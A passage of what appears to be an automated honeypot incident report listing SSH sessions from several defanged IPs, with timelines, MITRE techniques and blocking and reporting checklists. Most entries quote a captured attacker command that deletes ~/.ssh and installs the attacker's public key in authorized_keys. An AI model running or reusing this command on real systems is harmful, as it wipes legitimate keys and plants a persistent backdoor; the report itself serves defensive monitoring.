| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:49:30` | `cowrie.session.connect` |
| `2026-06-08 13:49:30` | `cowrie.client.version` |
| `2026-06-08 13:49:31` | `cowrie.client.kex` |
| `2026-06-08 13:49:32` | `cowrie.login.success` |
| `2026-06-08 13:49:33` | `cowrie.session.params` |
| `2026-06-08 13:49:33` | `cowrie.command.input` |
| `2026-06-08 13:49:33` | `cowrie.command.failed` |
| `2026-06-08 13:49:33` | `cowrie.log.closed` |
| `2026-06-08 13:49:34` | `cowrie.session.params` |
| `2026-06-08 13:49:34` | `cowrie.command.input` |
| `2026-06-08 13:49:34` | `cowrie.session.file_download` |
| `2026-06-08 13:49:34` | `cowrie.log.closed` |
| `2026-06-08 13:49:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-606a0c3647ff

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:49 |
| **Last Seen** | 2026-06-08 13:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:49:32` | `cowrie.session.connect` |
| `2026-06-08 13:49:32` | `cowrie.client.version` |
| `2026-06-08 13:49:32` | `cowrie.client.kex` |
| `2026-06-08 13:49:32` | `cowrie.login.success` |
| `2026-06-08 13:49:32` | `cowrie.session.params` |
| `2026-06-08 13:49:32` | `cowrie.command.input` |
| `2026-06-08 13:49:32` | `cowrie.command.failed` |
| `2026-06-08 13:49:32` | `cowrie.log.closed` |
| `2026-06-08 13:49:32` | `cowrie.session.params` |
| `2026-06-08 13:49:32` | `cowrie.command.input` |
| `2026-06-08 13:49:32` | `cowrie.session.file_download` |
| `2026-06-08 13:49:32` | `cowrie.log.closed` |
| `2026-06-08 13:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d076232e68e0

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:49 |
| **Last Seen** | 2026-06-08 13:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:49:34` | `cowrie.session.connect` |
| `2026-06-08 13:49:34` | `cowrie.client.version` |
| `2026-06-08 13:49:34` | `cowrie.client.kex` |
| `2026-06-08 13:49:34` | `cowrie.login.success` |
| `2026-06-08 13:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e05aa059c785

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 13:49 |
| **Last Seen** | 2026-06-08 13:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:49:38` | `cowrie.session.connect` |
| `2026-06-08 13:49:38` | `cowrie.client.version` |
| `2026-06-08 13:49:38` | `cowrie.client.kex` |
| `2026-06-08 13:49:40` | `cowrie.login.success` |
| `2026-06-08 13:49:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4492faae0586

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:52 |
| **Last Seen** | 2026-06-08 13:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:52:32` | `cowrie.session.connect` |
| `2026-06-08 13:52:32` | `cowrie.client.version` |
| `2026-06-08 13:52:32` | `cowrie.client.kex` |
| `2026-06-08 13:52:33` | `cowrie.login.success` |
| `2026-06-08 13:52:34` | `cowrie.session.params` |
| `2026-06-08 13:52:34` | `cowrie.command.input` |
| `2026-06-08 13:52:34` | `cowrie.command.failed` |
| `2026-06-08 13:52:34` | `cowrie.log.closed` |
| `2026-06-08 13:52:35` | `cowrie.session.params` |
| `2026-06-08 13:52:35` | `cowrie.command.input` |
| `2026-06-08 13:52:35` | `cowrie.session.file_download` |
| `2026-06-08 13:52:35` | `cowrie.log.closed` |
| `2026-06-08 13:52:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a542602aa410

| Field | Detail |
|---|---|
| **Source IP** | `34.123.134[.]194` |
| **First Seen** | 2026-06-08 13:52 |
| **Last Seen** | 2026-06-08 13:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:52:38` | `cowrie.session.connect` |
| `2026-06-08 13:52:38` | `cowrie.client.version` |
| `2026-06-08 13:52:38` | `cowrie.client.kex` |
| `2026-06-08 13:52:39` | `cowrie.login.success` |
| `2026-06-08 13:52:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.123.134[.]194` to AbuseIPDB if not already reported
- [ ] Block `34.123.134[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67bc6c42843c

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:53 |
| **Last Seen** | 2026-06-08 13:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:53:35` | `cowrie.session.connect` |
| `2026-06-08 13:53:35` | `cowrie.client.version` |
| `2026-06-08 13:53:35` | `cowrie.client.kex` |
| `2026-06-08 13:53:35` | `cowrie.login.success` |
| `2026-06-08 13:53:35` | `cowrie.session.params` |
| `2026-06-08 13:53:35` | `cowrie.command.input` |
| `2026-06-08 13:53:35` | `cowrie.command.failed` |
| `2026-06-08 13:53:35` | `cowrie.log.closed` |
| `2026-06-08 13:53:36` | `cowrie.session.params` |
| `2026-06-08 13:53:36` | `cowrie.command.input` |
| `2026-06-08 13:53:36` | `cowrie.session.file_download` |
| `2026-06-08 13:53:36` | `cowrie.log.closed` |
| `2026-06-08 13:53:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c1e967cdbe6

| Field | Detail |
|---|---|
| **Source IP** | `161.248.189[.]72` |
| **First Seen** | 2026-06-08 13:53 |
| **Last Seen** | 2026-06-08 13:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:53:37` | `cowrie.session.connect` |
| `2026-06-08 13:53:37` | `cowrie.client.version` |
| `2026-06-08 13:53:37` | `cowrie.client.kex` |
| `2026-06-08 13:53:37` | `cowrie.login.success` |
| `2026-06-08 13:53:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.248.189[.]72` to AbuseIPDB if not already reported
- [ ] Block `161.248.189[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5ef8951d86c

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 13:59 |
| **Last Seen** | 2026-06-08 14:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 13:59:56` | `cowrie.session.connect` |
| `2026-06-08 13:59:56` | `cowrie.client.version` |
| `2026-06-08 13:59:56` | `cowrie.client.kex` |
| `2026-06-08 13:59:57` | `cowrie.login.success` |
| `2026-06-08 13:59:58` | `cowrie.session.params` |
| `2026-06-08 13:59:58` | `cowrie.command.input` |
| `2026-06-08 13:59:58` | `cowrie.command.failed` |
| `2026-06-08 13:59:58` | `cowrie.log.closed` |
| `2026-06-08 13:59:59` | `cowrie.session.params` |
| `2026-06-08 13:59:59` | `cowrie.command.input` |
| `2026-06-08 14:00:00` | `cowrie.session.file_download` |
| `2026-06-08 14:00:00` | `cowrie.log.closed` |
| `2026-06-08 14:00:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2be31fca824

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 14:00 |
| **Last Seen** | 2026-06-08 14:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 14:00:03` | `cowrie.session.connect` |
| `2026-06-08 14:00:03` | `cowrie.client.version` |
| `2026-06-08 14:00:04` | `cowrie.client.kex` |
| `2026-06-08 14:00:05` | `cowrie.login.success` |
| `2026-06-08 14:00:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.176.210[.]17` to AbuseIPDB if not already reported
- [ ] Block `179.176.210[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ed083f5f5d4

| Field | Detail |
|---|---|
| **Source IP** | `50.84.211[.]204` |
| **First Seen** | 2026-06-08 14:12 |
| **Last Seen** | 2026-06-08 14:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 14:12:43` | `cowrie.session.connect` |
| `2026-06-08 14:12:43` | `cowrie.client.version` |
| `2026-06-08 14:12:44` | `cowrie.client.kex` |
| `2026-06-08 14:12:45` | `cowrie.login.success` |
| `2026-06-08 14:12:45` | `cowrie.session.params` |
| `2026-06-08 14:12:45` | `cowrie.command.input` |
| `2026-06-08 14:12:45` | `cowrie.command.failed` |
| `2026-06-08 14:12:46` | `cowrie.log.closed` |
| `2026-06-08 14:12:46` | `cowrie.session.params` |
| `2026-06-08 14:12:46` | `cowrie.command.input` |
| `2026-06-08 14:12:46` | `cowrie.session.file_download` |
| `2026-06-08 14:12:46` | `cowrie.log.closed` |
| `2026-06-08 14:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.84.211[.]204` to AbuseIPDB if not already reported
- [ ] Block `50.84.211[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e2e2eeb229e

| Field | Detail |
|---|---|
| **Source IP** | `50.84.211[.]204` |
| **First Seen** | 2026-06-08 14:12 |
| **Last Seen** | 2026-06-08 14:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 14:12:49` | `cowrie.session.connect` |
| `2026-06-08 14:12:49` | `cowrie.client.version` |
| `2026-06-08 14:12:49` | `cowrie.client.kex` |
| `2026-06-08 14:12:50` | `cowrie.login.success` |
| `2026-06-08 14:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.84.211[.]204` to AbuseIPDB if not already reported
- [ ] Block `50.84.211[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-747e7cc055a1

| Field | Detail |
|---|---|
| **Source IP** | `103.187.146[.]107` |
| **First Seen** | 2026-06-08 14:16 |
| **Last Seen** | 2026-06-08 14:16 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 14:16:06` | `cowrie.session.connect` |
| `2026-06-08 14:16:06` | `cowrie.client.version` |
| `2026-06-08 14:16:07` | `cowrie.client.kex` |
| `2026-06-08 14:16:07` | `cowrie.login.success` |
| `2026-06-08 14:16:07` | `cowrie.session.params` |
| `2026-06-08 14:16:07` | `cowrie.command.input` |
| `2026-06-08 14:16:07` | `cowrie.command.failed` |
| `2026-06-08 14:16:07` | `cowrie.log.closed` |
| `2026-06-08 14:16:07` | `cowrie.session.params` |
| `2026-06-08 14:16:07` | `cowrie.command.input` |
| `2026-06-08 14:16:07` | `cowrie.session.file_download` |
| `2026-06-08 14:16:07` | `cowrie.log.closed` |
| `2026-06-08 14:16:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.146[.]107` to AbuseIPDB if not already reported
- [ ] Block `103.187.146[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b094823f6cd

| Field | Detail |
|---|---|
| **Source IP** | `103.187.146[.]107` |
| **First Seen** | 2026-06-08 14:16 |
| **Last Seen** | 2026-06-08 14:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 14:16:09` | `cowrie.session.connect` |
| `2026-06-08 14:16:09` | `cowrie.client.version` |
| `2026-06-08 14:16:09` | `cowrie.client.kex` |
| `2026-06-08 14:16:09` | `cowrie.login.success` |
| `2026-06-08 14:16:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.187.146[.]107` to AbuseIPDB if not already reported
- [ ] Block `103.187.146[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-686212461aab

| Field | Detail |
|---|---|
| **Source IP** | `8.217.193[.]233` |
| **First Seen** | 2026-06-08 14:22 |
| **Last Seen** | 2026-06-08 14:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 14:22:53` | `cowrie.session.connect` |
| `2026-06-08 14:22:53` | `cowrie.client.version` |
| `2026-06-08 14:22:53` | `cowrie.client.kex` |
| `2026-06-08 14:22:53` | `cowrie.login.success` |
| `2026-06-08 14:22:53` | `cowrie.session.params` |
| `2026-06-08 14:22:53` | `cowrie.command.input` |
| `2026-06-08 14:22:54` | `cowrie.log.closed` |
| `2026-06-08 14:22:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.217.193[.]233` to AbuseIPDB if not already reported
- [ ] Block `8.217.193[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cbd3f6ec406

| Field | Detail |
|---|---|
| **Source IP** | `45.129.242[.]233` |
| **First Seen** | 2026-06-08 14:24 |
| **Last Seen** | 2026-06-08 14:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 14:24:27` | `cowrie.session.connect` |
| `2026-06-08 14:24:27` | `cowrie.client.version` |
| `2026-06-08 14:24:27` | `cowrie.client.kex` |
| `2026-06-08 14:24:28` | `cowrie.login.success` |
| `2026-06-08 14:24:28` | `cowrie.session.params` |
| `2026-06-08 14:24:28` | `cowrie.command.input` |
| `2026-06-08 14:24:28` | `cowrie.command.failed` |
| `2026-06-08 14:24:28` | `cowrie.log.closed` |
| `2026-06-08 14:24:28` | `cowrie.session.params` |
| `2026-06-08 14:24:28` | `cowrie.command.input` |
| `2026-06-08 14:24:29` | `cowrie.session.file_download` |
| `2026-06-08 14:24:29` | `cowrie.log.closed` |
| `2026-06-08 14:24:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.129.242[.]233` to AbuseIPDB if not already reported
- [ ] Block `45.129.242[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08eb79c9ead6

| Field | Detail |
|---|---|
| **Source IP** | `45.129.242[.]233` |
| **First Seen** | 2026-06-08 14:24 |
| **Last Seen** | 2026-06-08 14:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 14:24:31` | `cowrie.session.connect` |
| `2026-06-08 14:24:31` | `cowrie.client.version` |
| `2026-06-08 14:24:31` | `cowrie.client.kex` |
| `2026-06-08 14:24:31` | `cowrie.login.success` |
| `2026-06-08 14:24:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.129.242[.]233` to AbuseIPDB if not already reported
- [ ] Block `45.129.242[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce0c52f80924

| Field | Detail |
|---|---|
| **Source IP** | `179.176.210[.]17` |
| **First Seen** | 2026-06-08 14:27 |
| **Last Seen** | 2026-06-08 14:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
